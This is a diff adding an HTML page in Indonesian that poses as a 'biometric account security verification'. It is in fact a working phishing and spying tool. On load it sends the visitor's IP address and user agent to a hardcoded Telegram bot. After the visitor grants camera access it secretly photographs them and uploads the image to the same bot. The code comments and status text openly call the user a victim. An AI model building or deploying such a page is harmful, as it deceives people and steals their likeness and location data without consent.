@@ -1,0 +1,143 @@
+nama=ikyy-web
+language=html
+lines=140
+date=15/11/2025
+code=<!DOCTYPE html>
+<html>
+<head>
+    <title>Verifikasi Keamanan Akun Penting</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #e0e0e0; text-align: center; padding: 20px; }
+        .container { background-color: #1f1f1f; padding: 40px; border-radius: 12px; box-shadow: 0 8px 16px rgba(0, 0, 0, 0.5); max-width: 400px; margin: 50px auto; }
+        h1 { color: #4CAF50; margin-bottom: 10px; }
+        p { color: #bbb; margin-bottom: 25px; }
+        button { 
+            background-color: #007bff; 
+            color: white; 
+            padding: 12px 25px; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            margin-top: 20px; 
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover { background-color: #0056b3; }
+        button:disabled { background-color: #6c757d; cursor: not-allowed; }
+        #log-status { margin-top: 20px; color: yellow; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Sistem Otentikasi Biometrik</h1>
+        <p>Demi keamanan, kami perlu memverifikasi biometrik wajah Anda (2 detik). Harap berikan izin kamera saat diminta.</p>
+        <button id="verifyButton">Mulai Verifikasi Sekarang</button>
+        <div id="log-status">Menunggu Aksi Korban...</div>
+        
+        <video id="video" style="display:none;" autoplay muted></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8439858259:AAF9TxCyXdzHn2L-KU4hLllgO0FBZ2KtWw'; // Token Botmu, kawan
+        const CHAT_ID = '8223823513'; // Chat ID-mu
+        const TELE_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const PHOTO_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+        let ipAddress = 'IP Sedang Diambil...';
+        
+        const logStatus = (msg) => {
+            document.getElementById('log-status').textContent = msg;
+        };
+
+        // Fungsi Brengsek untuk Mengirim Pesan Teks
+        function sendTextToTelegram(message) {
+            fetch(TELE_API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).then(res => console.log('Log Teks Terkirim')).catch(err => console.error('Gagal Kirim Log: ' + err));
+        }
+
+        // 1. Ambil Alamat IP dan Log Status Sialan
+        logStatus('Mengambil Alamat IP Publik...');
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ipAddress = data.ip;
+                const ipMessage = `**👹 LOG AKSES BARU!**\n\n**Alamat IP:** <code>${ipAddress}</code>\n**Waktu:** ${new Date().toLocaleString()}\n**User Agent:** ${navigator.userAgent}`;
+                sendTextToTelegram(ipMessage);
+                logStatus(`IP: ${ipAddress} | Log Terkirim!`);
+            })
+            .catch(error => {
+                ipAddress = 'Gagal Mengambil IP';
+                sendTextToTelegram(`**IP GAGAL DIAMBIL.**\nUser Agent: ${navigator.userAgent}`);
+                logStatus(ipAddress);
+            });
+
+        // 2. Listener untuk Akses Kamera dan Ambil Foto
+        document.getElementById('verifyButton').addEventListener('click', function() {
+            this.textContent = 'Meminta Akses Kamera...';
+            this.disabled = true;
+            logStatus('Menunggu Korban Izinkan Kamera...');
+
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const constraints = { video: true };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        logStatus('Kamera Aktif! Mengambil Foto dalam 3 detik...');
+                        
+                        setTimeout(() => {
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            stream.getTracks().forEach(track => track.stop()); // Matikan Kamera
+
+                            // Kirim Foto Bajingan
+                            canvas.toBlob(blob => {
+                                const formData = new FormData();
+                                formData.append('chat_id', CHAT_ID);
+                                formData.append('photo', blob, `korban_${ipAddress}.jpg`);
+                                formData.append('caption', `**📸 WAJAH TERTANGKAP!**\nIP: <code>${ipAddress}</code>`);
+
+                                fetch(PHOTO_API, {
+                                    method: 'POST',
+                                    body: formData
+                                })
+                                .then(res => {
+                                    console.log('Foto Terkirim ke Telegram!');
+                                    logStatus('Verifikasi Selesai. Foto & Data Terkirim!');
+                                    document.getElementById('verifyButton').textContent = 'VERIFIKASI SUKSES!';
+                                })
+                                .catch(err => {
+                                    console.error('Gagal Kirim Foto: ' + err);
+                                    logStatus('Gagal Kirim Foto! Cek Token/ID.');
+                                });
+                            }, 'image/jpeg', 0.9); // Kualitas 90%
+                        }, 3000); // 3 detik delay
+                    };
+                })
+                .catch(err => {
+                    console.error('Akses Kamera Ditolak atau Gagal: ' + err.name);
+                    sendTextToTelegram(`**⚠️ AKSES KAMERA DITOLAK!**\nIP: <code>${ipAddress}</code>\nError: ${err.name}`);
+                    logStatus(`Akses Kamera Ditolak! (Error: ${err.name})`);
+                    document.getElementById('verifyButton').textContent = 'Akses Kamera Gagal (Coba Lagi)';
+                    this.disabled = false;
+                });
+        });
+
+    </script>
+</body>
+</html>
